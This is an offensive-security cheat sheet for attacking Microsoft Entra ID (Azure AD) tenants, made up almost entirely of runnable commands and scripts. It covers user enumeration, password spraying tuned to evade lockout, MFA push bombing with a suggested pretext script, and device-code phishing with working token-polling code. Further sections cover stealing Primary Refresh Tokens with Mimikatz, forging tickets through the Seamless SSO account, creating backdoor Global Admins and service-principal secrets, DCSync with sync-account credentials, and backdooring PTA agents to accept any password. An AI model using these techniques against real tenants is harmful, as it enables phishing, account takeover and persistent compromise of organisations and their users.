# Entra ID (Azure Active Directory)

## What is it?
Microsoft Entra ID (formerly Azure AD) is Microsoft's cloud identity platform — the IdP for Microsoft 365, Azure, and thousands of SaaS apps. Attack surface: password spraying, MFA bypass, Conditional Access bypass, OAuth token theft, PRT (Primary Refresh Token) abuse, Service Principal credential abuse, Seamless SSO NTLM hash extraction, and guest/external user misconfigurations. Tools: AADInternals, ROADtools, GraphRunner, TokenTactician, AzureHound.

Tenants identifiable via: `https://login.microsoftonline.com/<tenant>.onmicrosoft.com`

---

## Recon & Tenant Enumeration

```bash
# Tenant ID from domain
curl -s "https://login.microsoftonline.com/<domain.com>/.well-known/openid-configuration" | jq '{tenant_id:.token_endpoint}' | grep -oP '[0-9a-f-]{36}'

# Tenant info (no auth)
curl -s "https://login.microsoftonline.com/<domain.com>/v2.0/.well-known/openid-configuration" | jq '{issuer:.issuer, authorization_endpoint:.authorization_endpoint}'

# Check if domain is federated (ADFS) or managed (password hash sync)
curl -s "https://login.microsoftonline.com/common/userrealm/?user=test@<domain.com>&api-version=1.0" | \
  jq '{NameSpaceType:.NameSpaceType, FederationBrandName:.FederationBrandName, AuthURL:.AuthURL}'
# NameSpaceType: "Managed" = Azure AD native auth
# NameSpaceType: "Federated" = ADFS/third-party IdP

# AADInternals — tenant recon (no auth)
Import-Module AADInternals
Invoke-AADIntReconAsOutsider -DomainName <domain.com>
# Returns: tenant name, tenant ID, auth type, MDI (Defender for Identity), MFA methods, Seamless SSO status

# Get all domains in a tenant
curl -s "https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc" \
  -H "Content-Type: text/xml" \
  -d '<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>test@<domain.com></EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>'

# User enumeration without auth (timing-based or error differentiation)
# GET https://login.microsoftonline.com/common/GetCredentialType
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin@<domain.com>","isOtherIdpSupported":true,"checkPhones":false,"isRemoteNGCSupported":true,"isCookieBannerShown":false,"isFidoSupported":true,"originalRequest":""}' | \
  jq '{exists:.IfExistsResult, throttle:.ThrottleStatus}'
# IfExistsResult: 0 = user exists, 1 = doesn't exist, 5/6 = different tenant

# Bulk user enumeration
while read user; do
  result=$(curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$user@<domain.com>\"}" | python3 -c "import sys,json; print(json.load(sys.stdin)['IfExistsResult'])")
  [ "$result" = "0" ] && echo "[EXISTS] $user@<domain.com>"
done < usernames.txt
```

---

## Password Spraying

```bash
# AADInternals spray (respects lockout — 1 attempt per account)
Import-Module AADInternals
$creds = Invoke-AADIntPasswordSprayEWS -UserList users.txt -Password "Spring2024!" -Verbose

# MSOLSpray (PowerShell)
Import-Module MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password "Spring2024!"

# Go365 — spray via Microsoft Graph API endpoint (faster, detects lockout)
go365 -ul users.txt -p "Spring2024!" -d <domain.com> -o results.txt

# Spray via Graph API (manual)
curl -s -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&scope=openid&username=user@<domain.com>&password=Password1"

# Spray via legacy EWS endpoint (bypasses some MFA/CA policies)
curl -s "https://outlook.office365.com/EWS/Exchange.asmx" \
  -u "user@<domain.com>:Password1" \
  -H "Content-Type: text/xml" \
  -d '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFolder xmlns="http://schemas.microsoft.com/exchange/services/2006/messages"></GetFolder></soap:Body></soap:Envelope>'

# CredMaster — spray across multiple protocols + IP rotation
python3 credmaster.py --userfile users.txt --passwordfile passwords.txt \
  --plugin o365 --threads 1 --delay 30

# Timing — spray once per 30-60 min to avoid Smart Lockout (10 attempts = 1 min lockout)
# Smart Lockout baseline: 10 attempts before lockout, resets every 60 seconds
# Use 1 password per spray round, wait 60+ minutes between rounds

# Check for lockout status
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"username":"target@<domain.com>"}' | jq '.ThrottleStatus'
# ThrottleStatus: 0 = not throttled, 1 = throttled
```

---

## MFA Bypass Techniques

```bash
# --- Method 1: Legacy Protocol Spray (if Basic Auth still enabled) ---
# Legacy protocols bypass MFA if Conditional Access doesn't block them
# Targets: EWS, IMAP, POP3, SMTP, ActiveSync, AutoDiscover

# IMAP spray (MFA often not enforced)
curl -sk --url imaps://outlook.office365.com:993 \
  -u "user@<domain.com>:Password1" \
  --request 'LOGIN "user@<domain.com>" "Password1"'

# Hydra IMAP spray
hydra -L users.txt -p "Password1" -s 993 -S imap.gmail.com imap

# Check if legacy auth is enabled for a tenant
curl -s "https://login.microsoftonline.com/<domain.com>/.well-known/openid-configuration" | \
  jq '.token_endpoint_auth_methods_supported'

# --- Method 2: MFA Fatigue / Push Bombing ---
# Repeatedly spray correct credentials → floods user with MFA push notifications
# User eventually approves out of frustration or accident
# Works against Microsoft Authenticator app (Approve/Deny prompt)
# Pair with social engineering call: "IT here, we're pushing an MFA reset, please approve"

# --- Method 3: Device Code Phishing ---
# Generate a device code and trick user into entering it at microsoft.com/devicelogin
python3 -c "
import requests
r = requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
  data={'client_id':'1b730954-1685-4b74-9bfd-dac224a7b894',
        'scope':'openid profile email offline_access https://graph.microsoft.com/.default'})
print(r.json())
"
# Returns: user_code (8 char code), device_code, verification_uri (microsoft.com/devicelogin)
# Phish: "Your MFA device needs re-registration. Go to microsoft.com/devicelogin and enter: ABCD-EFGH"
# Poll for token:
python3 -c "
import requests, time
device_code = '<device_code_from_above>'
while True:
    r = requests.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
      data={'grant_type':'urn:ietf:params:oauth2:grant-type:device_code',
            'client_id':'1b730954-1685-4b74-9bfd-dac224a7b894',
            'device_code':device_code})
    if 'access_token' in r.text: print(r.json()); break
    time.sleep(5)
"

# --- Method 4: Adversary-in-the-Middle (AiTM) Phishing ---
# Evilginx2, Modlishka, or Microsoft's own detection bypass
# Proxy sits between user and Microsoft — captures session cookie (bypasses MFA)
# See Evilginx2 microsoft365 phishlet

# --- Method 5: Conditional Access Policy Gap ---
# CA policies may not apply to all clients or platforms
# Test: spray using different user agents (mobile, legacy, etc.)
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -H "User-Agent: BAV2ROPC" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&scope=openid&username=user@<domain>&password=Password1"
```

---

## Token Theft & Abuse

```bash
# --- Access Token via Device Code ---
# (See device code phishing above)

# --- Access Token via Refresh Token ---
curl -s -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&refresh_token=<refresh-token>&scope=https://graph.microsoft.com/.default"

# --- Decode JWT access token ---
echo "<access-token>" | python3 -c "
import sys, base64, json
token = sys.stdin.read().strip()
payload = token.split('.')[1]
payload += '=' * (4 - len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
"
# Look for: scp (scopes), roles, oid (user object ID), tid (tenant ID), upn (username)

# --- Use access token with Graph API ---
TOKEN="<access-token>"
curl -s "https://graph.microsoft.com/v1.0/me" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/users" -H "Authorization: Bearer $TOKEN"
curl -s "https://graph.microsoft.com/v1.0/groups" -H "Authorization: Bearer $TOKEN"

# --- Token for different resources (same refresh token) ---
# Exchange Online
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&refresh_token=<rt>&scope=https://outlook.office.com/.default"

# SharePoint
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&refresh_token=<rt>&scope=https://<tenant>.sharepoint.com/.default"

# Azure Resource Manager
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token" \
  -d "grant_type=refresh_token&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&refresh_token=<rt>&scope=https://management.azure.com/.default"
```

---

## PRT (Primary Refresh Token) Abuse

PRTs are long-lived tokens issued to Azure AD-joined or Hybrid-joined Windows devices. Stealing a PRT = impersonate the user without MFA (device compliance is already satisfied).

```bash
# PRT lives in LSASS memory on Azure AD-joined Windows devices
# Extract with Mimikatz (requires SYSTEM or debug privilege)
privilege::debug
sekurlsa::cloudap         # dumps PRT + ProofOfPossession key

# AADInternals — use stolen PRT to get tokens
# From mimikatz output, get: PRT (base64), ProofOfPossession key
Import-Module AADInternals
$prt = "<base64-prt>"
$sessionKey = "<hex-session-key>"
$nonce = Get-AADIntUserPRTNonce -PRTToken $prt

# Get access token using PRT
$token = Get-AADIntAccessTokenForMSGraph -PRTToken $prt -SessionKey $sessionKey -Nonce $nonce

# ROADtoken — extract PRT from Windows
# https://github.com/dirkjanm/ROADtools
python3 roadtx.py gettokens --prt <prt-cookie> --prt-sessionkey <hex-key>

# Browser-based PRT abuse (Edge/Chrome on AADJ machines pass PRT automatically)
# Create SSO cookie from PRT and use in browser
$cookie = New-AADIntUserPRTToken -RefreshToken $prt -SessionKey $sessionKey
# Open browser: navigate to login.microsoftonline.com with x-ms-RefreshTokenCredential cookie set

# Check if machine is Azure AD joined
dsregcmd /status
# Look for: AzureAdJoined: YES, WorkplaceJoined, SSO State
```

---

## Seamless SSO — NTLM Hash Extraction

Seamless SSO creates a computer account `AZUREADSSOACC$` in on-prem AD. Its Kerberos key can be used to forge Kerberos service tickets for Azure AD authentication.

```bash
# Check if Seamless SSO is enabled
curl -s "https://autologon.microsoftazuread-sso.com/<domain.com>/winauth/trust/2005/usernamemixed?client-request-id=$(python3 -c 'import uuid; print(uuid.uuid4())')"
# 401 = enabled, 404 = not enabled

# From inside the network — trigger NTLM auth to autologon endpoint
# This captures the NTLMv2 hash of the machine account's Kerberos key
# The autologon endpoint responds with NTLM challenge — use Responder/ntlmrelayx

# Responder — capture NTLM hash when user browser auto-authenticates
responder -I eth0 -rdw
# Or trigger via DNS poisoning pointing autologon.microsoftazuread-sso.com to Responder

# With on-prem AD access — extract AZUREADSSOACC$ Kerberos key
# (requires DA or ability to read the account)
Import-Module AADInternals
# Or via mimikatz lsadump::dcsync
lsadump::dcsync /user:AZUREADSSOACC$

# Forge Kerberos ticket for ANY user in Azure AD (including Global Admins)
# AADInternals kerberoast-style silver ticket for Azure AD
New-AADIntKerberosTicket -DomainName <domain.com> -UserPrincipalName "globaladmin@<domain.com>" -UserSid <SID> -NTLM <AZUREADSSOACC-hash>
```

---

## Conditional Access Bypass

```bash
# Check current CA policies applied to your token
curl -s "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" \
  -H "Authorization: Bearer $ADMIN_TOKEN" | jq '.value[] | {displayName:.displayName, state:.state}'

# --- Bypass 1: Named Location gaps ---
# CA policies often exclude specific IP ranges (office IPs, VPN)
# From inside: check what IP is seen by Azure
curl -s "https://ipinfo.io/json"

# --- Bypass 2: Compliant device spoofing ---
# CA "require compliant device" — use device token from a real managed device
# OR use PRT from an already-compliant Azure AD joined device

# --- Bypass 3: Legacy protocol (if not blocked) ---
# Some CA policies don't apply to legacy auth clients
curl -s -X POST "https://login.microsoftonline.com/<tenant>/oauth2/token" \
  -d "grant_type=password&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&resource=https://graph.microsoft.com&username=user@<domain>&password=Password1"

# --- Bypass 4: App exclusions ---
# Some apps excluded from CA (breakglass accounts, legacy apps)
# Test different client_id values to find excluded apps:
CLIENT_IDS=(
  "1b730954-1685-4b74-9bfd-dac224a7b894"   # Azure PowerShell
  "04b07795-8ddb-461a-bbee-02f9e1bf7b46"   # Azure CLI
  "1950a258-227b-4e31-a9cf-717495945fc2"   # Microsoft Azure PowerShell
  "d3590ed6-52b3-4102-aeff-aad2292ab01c"   # Microsoft Office
)

# --- Bypass 5: Token from unmanaged device with MFA already done ---
# If MFA was done but no compliant device check — CA may allow

# --- Bypass 6: Guest account misconfiguration ---
# External/guest users may have different CA policies applied
# Invite your attacker account as guest → different policy set
```

---

## Service Principal & App Registration Abuse

```bash
# List all service principals
curl -s "https://graph.microsoft.com/v1.0/servicePrincipals?\$top=999" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | {displayName:.displayName, appId:.appId, id:.id}'

# List app registrations with secrets/certs
curl -s "https://graph.microsoft.com/v1.0/applications?\$top=999" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | {displayName:.displayName, appId:.appId, passwordCredentials:.passwordCredentials}'

# Get permissions assigned to a service principal
curl -s "https://graph.microsoft.com/v1.0/servicePrincipals/<id>/oauth2PermissionGrants" \
  -H "Authorization: Bearer $TOKEN"

# Find over-privileged service principals (Global Admin, etc.)
curl -s "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments?\$expand=principal&\$filter=roleDefinitionId eq '<global-admin-role-id>'" \
  -H "Authorization: Bearer $TOKEN"

# Add credentials to a service principal (if you have Application.ReadWrite.All)
curl -s -X POST "https://graph.microsoft.com/v1.0/applications/<object-id>/addPassword" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"passwordCredential":{"displayName":"backdoor"}}'
# Returns: clientSecret — use with tenant ID to auth as this app

# Authenticate as service principal with client secret
curl -s -X POST "https://login.microsoftonline.com/<tenant-id>/oauth2/v2.0/token" \
  -d "grant_type=client_credentials&client_id=<app-id>&client_secret=<secret>&scope=https://graph.microsoft.com/.default"

# Find managed identities with over-permissive roles
az login --service-principal -u <app-id> -p <secret> --tenant <tenant-id>
az role assignment list --all --assignee <app-id> -o table
```

---

## Microsoft Graph API Enumeration

```bash
TOKEN="<access-token>"
BASE="https://graph.microsoft.com/v1.0"

# Current user info
curl -s "$BASE/me" -H "Authorization: Bearer $TOKEN" | jq '{displayName:.displayName, userPrincipalName:.userPrincipalName, id:.id}'

# All users
curl -s "$BASE/users?\$top=999&\$select=displayName,userPrincipalName,onPremisesSamAccountName,assignedLicenses" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[] | {name:.displayName, upn:.userPrincipalName, sam:.onPremisesSamAccountName}'

# All groups + members
curl -s "$BASE/groups?\$top=999" -H "Authorization: Bearer $TOKEN" | jq '.value[] | {name:.displayName, id:.id}'
curl -s "$BASE/groups/<group-id>/members" -H "Authorization: Bearer $TOKEN" | jq '.value[].userPrincipalName'

# Global Admins
curl -s "$BASE/directoryRoles" -H "Authorization: Bearer $TOKEN" | jq '.value[] | select(.displayName=="Global Administrator") | .id'
curl -s "$BASE/directoryRoles/<role-id>/members" -H "Authorization: Bearer $TOKEN" | jq '.value[].userPrincipalName'

# Email / mailboxes (requires Mail.Read)
curl -s "$BASE/me/messages?\$top=50" -H "Authorization: Bearer $TOKEN" | jq '.value[] | {subject:.subject, from:.from}'
curl -s "$BASE/users/<user-id>/messages?\$top=50" -H "Authorization: Bearer $TOKEN"

# Files (OneDrive / SharePoint — requires Files.Read)
curl -s "$BASE/me/drive/root/children" -H "Authorization: Bearer $TOKEN" | jq '.value[] | {name:.name, webUrl:.webUrl}'

# Search for sensitive files
curl -s "$BASE/search/query" -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"requests":[{"entityTypes":["driveItem"],"query":{"queryString":"password OR secret OR credentials"},"from":0,"size":25}]}'

# Teams messages (requires ChannelMessage.Read.All)
curl -s "$BASE/teams" -H "Authorization: Bearer $TOKEN"
curl -s "$BASE/teams/<team-id>/channels/<channel-id>/messages" -H "Authorization: Bearer $TOKEN"

# Azure AD audit logs (requires AuditLog.Read.All — admin)
curl -s "$BASE/auditLogs/signIns?\$top=50" -H "Authorization: Bearer $TOKEN"
```

---

## AADInternals — Key Commands

```powershell
Import-Module AADInternals

# External recon (no auth)
Invoke-AADIntReconAsOutsider -DomainName company.com | Format-List

# Get access token (various methods)
Get-AADIntAccessTokenForMSGraph                          # interactive browser
Get-AADIntAccessTokenForMSGraph -Credentials (Get-Credential)  # creds
Get-AADIntAccessTokenForEXO                              # Exchange Online token

# User enumeration
Invoke-AADIntUserEnumerationAsOutsider -UserName user@company.com
Invoke-AADIntUserEnumerationAsOutsider -UserList users.txt

# Dump tenant info
$token = Get-AADIntAccessTokenForMSGraph
Get-AADIntUsers -AccessToken $token | Select UserPrincipalName, DisplayName, Enabled
Get-AADIntGroups -AccessToken $token
Get-AADIntServicePrincipals -AccessToken $token

# Password spray
Invoke-AADIntPasswordSprayEWS -UserList users.txt -Password "Spring2024!"
Invoke-AADIntPasswordSprayGraph -UserList users.txt -Password "Spring2024!"

# Dump all AD sync (if Azure AD Connect compromise)
Get-AADIntSyncCredentials           # gets MSOL service account password
Invoke-AADIntReconAsInsider         # full internal recon

# Backdoor — create/modify accounts
New-AADIntUser -UserPrincipalName backdoor@company.com -DisplayName "IT Support" -Password "P@ssw0rd123!"
Add-AADIntGlobalAdmin -UserPrincipalName backdoor@company.com
Set-AADIntUserPassword -SourceAnchor <id> -Password "Backdoor123!"  # bypass MFA-protected reset

# Pass-the-PRT
$prt = Get-AADIntUserPRT -AccessToken $token
New-AADIntUserPRTToken -RefreshToken $prt -SessionKey $sessionkey
```

---

## ROADtools — Graph Enumeration

```bash
# Install
pip install roadrecon

# Authenticate (interactive or device code)
roadrecon auth -t <tenant-id>
roadrecon auth --device-code

# Gather all tenant data into SQLite DB
roadrecon gather

# Launch web UI to browse gathered data
roadrecon gui   # browse at http://localhost:5000

# CLI queries
roadrecon dump --users
roadrecon dump --groups
roadrecon dump --servicePrincipals
roadrecon dump --applications

# AzureHound — BloodHound data for Entra ID
./azurehound -u "user@domain.com" -p "Password1" list --tenant "<tenant-id>" -o azurehound-output.json
# Import into BloodHound → attack paths from Entra ID to Azure resources
```

---

## Azure AD Connect Attacks

Azure AD Connect syncs on-prem AD to Entra ID. Compromise gives full tenant control.

```bash
# MSOL service account has DCSync rights on-prem
# Check for MSOL_ account in AD
Get-ADUser -Filter 'Name -like "MSOL_*"' | Select SamAccountName, DistinguishedName

# Extract MSOL account password from Azure AD Connect server (local admin required)
Import-Module AADInternals
Get-AADIntSyncCredentials
# Returns: MSOL username + cleartext password
# Also returns: Azure AD service account credentials

# Use MSOL creds to DCSync from anywhere on network
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt /dc:<dc-ip> /user:<MSOL_account>
secretsdump.py 'corp.local/<MSOL_account>:<password>@<dc-ip>'

# Pass-Through Authentication (PTA) agent abuse
# PTA agent validates passwords against on-prem AD
# Backdoor the PTA agent to accept any password:
Import-Module AADInternals
Install-AADIntPTASpy   # intercepts password validation calls — logs all auth attempts
Set-AADIntPTABypass -Enable   # makes agent accept any password for any user
```

---

## Dangerous Configurations

| Config | Risk |
|--------|------|
| Global Admin assigned to service principal | SP creds = full tenant takeover |
| Legacy authentication not blocked by CA | MFA bypass via IMAP/EWS |
| No MFA for admins | Single password compromise = full access |
| SSPR (Self-Service Password Reset) for admins | Phone/email takeover → admin reset |
| Seamless SSO enabled + AZUREADSSOACC$ compromised | Forge Azure AD tickets for any user |
| Azure AD Connect server compromised | MSOL account = DCSync + tenant access |
| Guest access unrestricted | External users enumerate directory |
| App registrations with long-lived secrets | Static creds → persistent access |
| Device compliance not required by CA | Token from unmanaged device sufficient |
| PTA agent running on compromised host | Intercept all password auth |

---

## Quick Reference

```bash
# Tenant recon (no auth)
curl -s "https://login.microsoftonline.com/<domain>/.well-known/openid-configuration" | jq '.issuer'
curl -s "https://login.microsoftonline.com/common/userrealm/?user=test@<domain>&api-version=1.0" | jq '{type:.NameSpaceType}'

# User enumeration
curl -s -X POST "https://login.microsoftonline.com/common/GetCredentialType" \
  -H "Content-Type: application/json" \
  -d '{"username":"user@<domain>"}' | jq '.IfExistsResult'
# 0 = exists, 1 = doesn't exist

# Device code phishing
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode" \
  -d "client_id=1b730954-1685-4b74-9bfd-dac224a7b894&scope=https://graph.microsoft.com/.default" | jq '{user_code:.user_code, message:.message}'

# Decode JWT token
echo "<token>" | python3 -c "import sys,base64,json; p=sys.stdin.read().strip().split('.')[1]; p+='='*(4-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"

# Graph API — list all users
curl -s "https://graph.microsoft.com/v1.0/users?\$top=999" \
  -H "Authorization: Bearer $TOKEN" | jq '.value[].userPrincipalName'

# Seamless SSO check
curl -s "https://autologon.microsoftazuread-sso.com/<domain>/winauth/trust/2005/usernamemixed" -o /dev/null -w "%{http_code}"
# 401 = enabled

# AADInternals spray
Invoke-AADIntPasswordSprayEWS -UserList users.txt -Password "Spring2024!"

# Extract Azure AD Connect creds
Get-AADIntSyncCredentials
```
